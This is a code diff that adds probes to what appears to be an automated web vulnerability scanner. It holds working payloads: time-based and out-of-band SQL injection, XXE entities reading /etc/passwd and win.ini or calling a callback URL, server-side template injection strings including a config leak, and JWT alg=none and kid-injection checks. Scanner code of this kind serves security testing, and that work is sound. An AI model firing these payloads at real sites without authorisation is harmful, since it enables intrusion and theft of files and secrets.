@@ -1152,6 +1152,15 @@ async def test_waf_advanced(pool, target, active_probe=True):
     cookies_str = headers_lower.get("set-cookie", "")
 
     candidates = _waf_match_by_headers(headers_lower, cookies_str)
+    # === EXTENDED (Stage 2.D) ===
+    try:
+        ext_candidates = _waf_match_extended(headers_lower, cookies_str, (resp.text or "").lower())
+        for ec in ext_candidates:
+            ec["source"] = ec.get("source", "extended")
+        candidates = candidates + [e for e in ext_candidates if not any(e["name"] == c["name"] for c in candidates)]
+    except Exception:
+        pass
+    # === END EXTENDED ===
     result["all_candidates"] = candidates
 
     if candidates:
@@ -2297,6 +2306,111 @@ async def run_sqli_advanced(pool, endpoint, params):
     return all_findings
 
 
+async def test_sqli_time_advanced(pool, endpoint, params, oast=None):
+    """Advanced time-based SQLi: sub-second + OAST.
+
+    Uses precise timing and a baseline to reduce false positives.
+    """
+    from urllib.parse import quote
+    import time as _time
+    findings = []
+    if not params:
+        return findings
+
+    # 2s, 4s, 6s delays
+    DELAY_PAYLOADS = [
+        ("1' AND SLEEP(2)-- -", 2),
+        ("1' AND SLEEP(4)-- -", 4),
+        ("1' AND PG_SLEEP(2)-- -", 2),
+        ("1; WAITFOR DELAY '0:0:2'-- -", 2),
+        ("1' AND (SELECT 1 FROM (SELECT SLEEP(2))a)-- -", 2),
+    ]
+
+    for param in params:
+        # Baseline (average of 2 requests)
+        times = []
+        try:
+            for _ in range(2):
+                t0 = _time.monotonic()
+                await pool.send("GET", endpoint + "?" + param + "=1")
+                times.append(_time.monotonic() - t0)
+            baseline = sum(times) / len(times) if times else 1.0
+        except Exception:
+            continue
+
+        for payload, expected in DELAY_PAYLOADS:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                t0 = _time.monotonic()
+                resp = await pool.send("GET", test_url)
+                elapsed = _time.monotonic() - t0
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            # Threshold: at least 1.5s beyond baseline
+            if elapsed >= baseline + max(1.5, expected * 0.7):
+                # Verify with second request
+                try:
+                    t1 = _time.monotonic()
+                    await pool.send("GET", test_url)
+                    elapsed2 = _time.monotonic() - t1
+                except Exception:
+                    elapsed2 = 0
+                if elapsed2 >= baseline + max(1.5, expected * 0.7):
+                    findings.append({
+                        "vuln_class": "sqli",
+                        "subtype": "time_based_advanced",
+                        "severity": "critical",
+                        "url": test_url,
+                        "injected_url": test_url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "delay: " + str(round(elapsed, 2)) + "s + " + str(round(elapsed2, 2)) + "s, baseline: " + str(round(baseline, 2)) + "s",
+                        "confidence": 0.9,
+                    })
+                    log.info("sqli_time_advanced_found", param=param, delay=elapsed)
+                    break
+    # OAST-based (out-of-band)
+    if oast:
+        try:
+            payload_url = oast.get_payload_url()
+            for param in params[:3]:
+                oast_payloads = [
+                    "1' AND LOAD_FILE('" + payload_url + "')-- -",
+                    "1' UNION SELECT '" + payload_url + "'-- -",
+                ]
+                for payload in oast_payloads:
+                    try:
+                        test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                        await pool.send("GET", test_url)
+                    except Exception:
+                        continue
+            # Wait briefly for callbacks
+            import asyncio as _a
+            for _ in range(4):
+                await _a.sleep(0.5)
+                if oast.callbacks:
+                    break
+            if oast.callbacks:
+                findings.append({
+                    "vuln_class": "sqli",
+                    "subtype": "oast_blind",
+                    "severity": "critical",
+                    "url": endpoint,
+                    "injected_url": endpoint,
+                    "param": params[0] if params else "",
+                    "payload": "OAST callback",
+                    "evidence": "OAST received " + str(len(oast.callbacks)) + " callbacks",
+                    "confidence": 0.95,
+                })
+                log.info("sqli_oast_found", callbacks=len(oast.callbacks))
+        except Exception as _e:
+            log.debug("sqli_oast_error", error=str(_e))
+    log.info("sqli_time_advanced_complete", findings=len(findings))
+    return findings
+
+
 async def test_sqli(pool, endpoint, params):
     """Test for SQL injection (error-based + time-based)."""
     error_payloads = [
@@ -3007,6 +3121,16 @@ async def test_jwt(pool, target):
     # Check for JWT in cookies or common endpoints
     resp = await pool.send("GET", target)
     # Look for JWT patterns in response
+    # JWT_IMPROVED_v2
+    # Use framework helper if available
+    try:
+        from framework_bridge import FRAMEWORK_DIR
+        import sys as _sys
+        _fw_path = str(FRAMEWORK_DIR)
+        if _fw_path not in _sys.path:
+            _sys.path.insert(0, _fw_path)
+    except Exception:
+        pass
     jwt_pattern = __import__("re").compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
     matches = jwt_pattern.findall(resp.text)
     for token in matches[:3]:
@@ -3030,6 +3154,139 @@ async def test_jwt(pool, target):
                 })
         except Exception:
             pass
+    return findings
+
+
+async def test_jwt_advanced(pool, target):
+    """Advanced JWT analysis: alg=none, kid injection, weak claims."""
+    import re as _re
+    import base64 as _b64
+    import json as _json
+    findings = []
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        return findings
+    body = resp.text or ""
+    jwt_re = _re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
+    tokens = jwt_re.findall(body)[:5]
+    for token in tokens:
+        parts = token.split(".")
+        if len(parts) != 3:
+            continue
+        try:
+            padded = parts[0] + "=" * (-len(parts[0]) % 4)
+            header = _json.loads(_b64.urlsafe_b64decode(padded))
+        except Exception:
+            continue
+        alg = header.get("alg", "").lower()
+        # Check alg=none
+        if alg == "none":
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "alg_none",
+                "severity": "critical",
+                "url": target,
+                "param": "Authorization",
+                "payload": token[:50] + "...",
+                "evidence": "JWT with alg=none detected",
+                "confidence": 0.95,
+            })
+        # Check kid injection
+        kid = header.get("kid", "")
+        if kid and any(c in str(kid) for c in ["../", "/etc/", "|", ";"]):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "kid_injection",
+                "severity": "high",
+                "url": target,
+                "param": "kid",
+                "payload": str(kid)[:50],
+                "evidence": "JWT kid contains injection patterns",
+                "confidence": 0.7,
+            })
+        # Weak algorithm
+        if alg == "hs256":
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "weak_alg_hs256",
+                "severity": "info",
+                "url": target,
+                "param": "alg",
+                "payload": "HS256",
+                "evidence": "JWT uses HS256 (symmetric)",
+                "confidence": 0.5,
+            })
+    log.info("jwt_advanced_complete", tokens=len(tokens), findings=len(findings))
+    return findings
+
+
+async def test_xxe_advanced(pool, endpoints, oast=None):
+    """Advanced XXE: file disclosure + OAST-based blind."""
+    findings = []
+    if not endpoints:
+        return findings
+    FILE_PAYLOADS = [
+        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
+         ["root:x:", "daemon:x:", "nobody:x:"]),
+        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
+         ["[extensions]", "[fonts]", "for 16-bit app support"]),
+    ]
+    for endpoint in endpoints[:3]:
+        for payload, indicators in FILE_PAYLOADS:
+            try:
+                resp = await pool.send("POST", endpoint, content=payload,
+                    headers={"Content-Type": "application/xml"})
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body = resp.text or ""
+            for ind in indicators:
+                if ind in body:
+                    findings.append({
+                        "vuln_class": "xxe",
+                        "subtype": "file_disclosure",
+                        "severity": "critical",
+                        "url": endpoint,
+                        "injected_url": endpoint,
+                        "param": "XML body",
+                        "payload": payload[:100],
+                        "evidence": body[:300],
+                        "confidence": 0.95,
+                    })
+                    log.info("xxe_file_found", endpoint=endpoint)
+                    break
+    # OAST-based blind XXE
+    if oast:
+        try:
+            payload_url = oast.get_payload_url()
+            for endpoint in endpoints[:2]:
+                oast_payload = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "' + payload_url + '">]><r>&xxe;</r>'
+                try:
+                    await pool.send("POST", endpoint, content=oast_payload,
+                        headers={"Content-Type": "application/xml"})
+                except Exception:
+                    continue
+            import asyncio as _a
+            for _ in range(4):
+                await _a.sleep(0.5)
+                if oast.callbacks:
+                    break
+            if oast.callbacks:
+                findings.append({
+                    "vuln_class": "xxe",
+                    "subtype": "oast_blind",
+                    "severity": "critical",
+                    "url": endpoints[0],
+                    "injected_url": endpoints[0],
+                    "param": "XML body",
+                    "payload": "OAST callback",
+                    "evidence": "OAST received " + str(len(oast.callbacks)) + " callbacks",
+                    "confidence": 0.95,
+                })
+        except Exception as _e:
+            log.debug("xxe_oast_error", error=str(_e))
+    log.info("xxe_advanced_complete", findings=len(findings))
     return findings
 
 
@@ -3061,6 +3318,54 @@ async def test_xxe(pool, endpoints):
                     })
                     log.info("xxe_found", endpoint=endpoint)
                     break
+    return findings
+
+
+async def test_ssti_advanced(pool, endpoints, params=None):
+    """Advanced SSTI: polyglot payloads + engine-specific detection."""
+    if params is None:
+        params = ["name", "q", "search", "template", "view", "page"]
+    findings = []
+    # (payload, expected_marker, engine)
+    PAYLOADS = [
+        ("{{7*7}}", "49", "Jinja2/Twig"),
+        ("${7*7}", "49", "Freemarker/JSP EL"),
+        ("#{7*7}", "49", "Ruby ERB"),
+        ("{{7*'7'}}", "7777777", "Jinja2"),
+        ("<%= 7*7 %>", "49", "ERB"),
+        ("{7*7}", "49", "Smarty"),
+        ("${{7*7}}", "49", "Generic"),
+        ("{{config}}", "SECRET_KEY", "Jinja2 config leak"),
+        ("{{self.__class__}}", "class", "Jinja2 RCE hint"),
+    ]
+    for endpoint in endpoints[:3]:
+        for param in params:
+            for payload, expected, engine in PAYLOADS:
+                from urllib.parse import quote
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                try:
+                    resp = await pool.send("GET", test_url)
+                except Exception:
+                    continue
+                if not resp or resp.status == 0:
+                    continue
+                body = resp.text or ""
+                if expected in body and payload not in body:
+                    findings.append({
+                        "vuln_class": "ssti",
+                        "subtype": "template_injection",
+                        "severity": "critical",
+                        "url": test_url,
+                        "injected_url": test_url,
+                        "param": param,
+                        "payload": payload,
+                        "engine_hint": engine,
+                        "evidence": "Expected " + expected + " found",
+                        "confidence": 0.9,
+                    })
+                    log.info("ssti_advanced_found", param=param, engine=engine)
+                    break
+    log.info("ssti_advanced_complete", findings=len(findings))
     return findings
 
 
